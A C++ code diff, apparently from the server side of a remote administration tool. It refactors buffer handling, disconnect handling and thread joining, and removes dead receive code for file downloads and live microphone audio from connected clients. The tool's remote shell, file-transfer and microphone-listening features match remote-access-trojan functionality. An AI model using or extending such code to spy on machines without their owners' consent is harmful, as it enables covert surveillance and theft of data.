@@ -14,19 +14,26 @@ std::mutex vector_mutex;
 
 void Cliente_Handler::Spawn_Handler(){
     this->isRunning = true;
-    char cBuffer[1024 * 100];
+    int iBufferSize = 1024 * 100;
+    char *cBuffer = new char[iBufferSize];
     while (this->isRunning) {
         //Esperar por datos y procesarlos
-        ZeroMemory(cBuffer, sizeof(cBuffer));
+        ZeroMemory(cBuffer, iBufferSize);
 
-        int iRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, sizeof(cBuffer), 0, false);
+        int iRecibido = p_Servidor->cRecv(this->p_Cliente._sckCliente, cBuffer, iBufferSize, 0, false);
         if (WSAGetLastError() == WSAEWOULDBLOCK) {
             //No hay datos todavia, esperar un poco mas
             Sleep(10);
             continue;
         }
-        if (iRecibido == -1 || iRecibido == WSAECONNRESET) {
+
+        if (iRecibido <= 0 && GetLastError() != WSAEWOULDBLOCK) {
             this->isRunning = false;
+            //Si la ventana sigue abierta
+            FrameCliente* temp_cli = (FrameCliente*)wxWindow::FindWindowByName(this->p_Cliente._id);
+            if (temp_cli) {
+                temp_cli->SetTitle(this->p_Cliente._id + " [DESCONECTADO]");
+            }
             break;
         }
 
@@ -230,13 +237,14 @@ void Cliente_Handler::Spawn_Handler(){
             continue;
         }
     }
+
+    if (cBuffer) {
+        delete[] cBuffer;
+        cBuffer = nullptr;
+    }
+
     this->Log("Funado");
 
-    //Si la ventana sigue abierta
-    FrameCliente* temp_cli = (FrameCliente*)wxWindow::FindWindowByName(this->p_Cliente._id);
-    if (temp_cli) {
-        temp_cli->SetTitle(this->p_Cliente._id + " [DESCONECTADO]");
-    }
 }
 
 void Cliente_Handler::EscribirSalidShell(std::string strSalida) {
@@ -381,13 +389,14 @@ void Servidor::m_Handler(){
 }
 
 void Servidor::m_JoinThreads() {
+    if (this->thListener.joinable()) {
+        this->thListener.join();
+    }
+
     if (this->thCleanVC.joinable()) {
         this->thCleanVC.join();
     }
 
-    if (this->thListener.joinable()) {
-        this->thListener.join();
-    }
     this->m_txtLog->LogThis("Thread LISTENER terminada", LogType::LogMessage);
 }
 
@@ -578,11 +587,9 @@ void Servidor::m_Escucha(){
     struct timeval timeout;
     timeout.tv_sec = 1;
     timeout.tv_usec = 0;
+    
     fd_set fdMaster;
     FD_ZERO(&fdMaster);
-
-    char cBuffer[1024 * 100]; //100 KB
-    
     FD_SET(this->sckSocket, &fdMaster);
     
     while(this->p_Escuchando){
@@ -613,8 +620,6 @@ void Servidor::m_Escucha(){
                 structNuevoCliente._id = strTmpId;
                 structNuevoCliente._strIp = strtmpIP;
 
-                //Agregar el cliente al fdmaster
-                //FD_SET(sckNuevoCliente._sckSocket, &fdMaster);
                 
                 //Agregar el cliente al vector global - se agrega a la list una vez se reciba la info
                 std::unique_lock<std::mutex> lock(vector_mutex);
@@ -623,124 +628,11 @@ void Servidor::m_Escucha(){
                 nCliente->Spawn_Thread(); // llama a nCliente->Spawn_Handler que es el que controla el cliente
                 this->vc_Clientes.push_back(nCliente);
 
-                lock.unlock();
-
-                //spawn thread
-                
-                
-            } else {
-                continue;
-                //Datos de algun cliente :v
-                ZeroMemory(cBuffer, sizeof(cBuffer));
-                
-                int iRecibido = this->cRecv(iSock, cBuffer, sizeof(cBuffer), 0, false);
-                
-                if (iRecibido == WSAECONNRESET) {
-                    //El cliente cerro la conexion
-                    std::unique_lock<std::mutex> lock(vector_mutex);
-                    
-                    auto tmpCli = this->um_Clientes.find(iSock);
-                    if (tmpCli != this->um_Clientes.end()) {
-                        tmpCli->second._isBusy = false;
-                        tmpCli->second._ttUltimaVez = PING_TIME;
-                        FD_CLR(iSock, &fdMaster);
-                    }
-                    lock.unlock();
-                    
-                    continue;
-                }
-
-                if (iRecibido <= 0) {
-                    closesocket(iSock);
-                    FD_CLR(iSock, &fdMaster);
-                } else {
-                    
-                    std::vector<std::string> vcDatos = strSplit(std::string(cBuffer), '\\', 1);
-
-                    if (vcDatos.size() == 0) {
-                        std::cout << "No su pudo procesar :<<< " << cBuffer << std::endl;
-                        continue;
-                    }
-
-                    std::string strTempID = "";
-                    std::unique_lock<std::mutex> lock(vector_mutex);
-
-                    auto cliIT = this->um_Clientes.find(iSock);
-                    if (cliIT != this->um_Clientes.end()) {
-                        strTempID = cliIT->second._id;
-                    }else {
-                        std::cout << "[X] No se pudo encontrar cliente" << std::endl;
-                        lock.unlock();
-                        continue;
-                    }
-                    lock.unlock();
-
-                    //Prioridad descarga de archivos
-                    if (vcDatos[0] == std::to_string(EnumComandos::FM_Descargar_Archivo_Recibir)) {
-                        vcDatos = strSplit(std::string(cBuffer), '\\', 2);
-                        // CMD + 2 slashs /  +len del id
-                        int iHeader = 5 + vcDatos[1].size();
-                        char* cBytes = cBuffer + iHeader;
-                        
-                        std::unique_lock<std::mutex> lock(vector_mutex);
-                        
-                        auto archivoIter = cliIT->second.um_Archivos_Descarga2.find(vcDatos[1]);
-                        if (archivoIter != cliIT->second.um_Archivos_Descarga2.end() && archivoIter->second.iFP != nullptr) {
-                            fwrite(cBytes, sizeof(char), iRecibido - iHeader, archivoIter->second.iFP);
-                            archivoIter->second.uDescargado += (iRecibido - iHeader);
-                        }
-                        
-                        lock.unlock();
-                        continue;
-                    }
-
-                    vcDatos = strSplit(std::string(cBuffer), '\\', 4);
-
-                    if (vcDatos[0] == std::to_string(EnumComandos::Mic_Refre_Resultado)) {
-                        //Resultado de dispositivos de entrada (Mic)
-                        wxArrayString cli_devices;
-                        for (int i = 1; i<int(vcDatos.size()); i++) {
-                            cli_devices.push_back(vcDatos[i]);
-                        }
-
-                        FrameCliente* temp = (FrameCliente*)wxWindow::FindWindowByName(strTempID);
-                        if (temp) {
-                            panelMicrophone* temp_panel = (panelMicrophone*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Microphone, temp);
-                            if (temp_panel) {
-                                wxComboBox* temp_combo_box = (wxComboBox*)wxWindow::FindWindowById(EnumIDS::ID_Panel_Mic_CMB_Devices, temp_panel);
-                                if (temp_combo_box) {
-                                    temp_combo_box->Clear();
-                                    temp_combo_box->Append(cli_devices);
-                                }
-                            }
-                        }
-                        else {
-                            std::cout << "No se pudo encontrar ventana activa con nombre " << strTempID << std::endl;
-                        }
-                        continue;
-                    }
-
-                    
-                    if (vcDatos[0] == "LMIC") {
-                        //Siempre escucha el mic por defecto, 
-                        //implementar que escucha por el dispositivo seleccionado en el combobox
-                        
-                        //Solo reproducir por ahora, no importa de quien venga
-                        if (iRecibido > 5) {
-                            std::cout << "MIC " << iRecibido << std::endl;
-                            this->m_ReproducirPaquete(cBuffer + 5, iRecibido - 5);
-                        }else {
-                            std::cout << "Paquete muy pequeño\n";
-                        }
-                        continue;
-                    }
-                }
             }
-
 
         }
     }
-    std::cout << "DONE Listen" << std::endl;
+    std::cout<<"DONE Listen" << std::endl;
 }
 
 void Servidor::m_ReproducirPaquete(char* pBuffer, size_t iLen) {
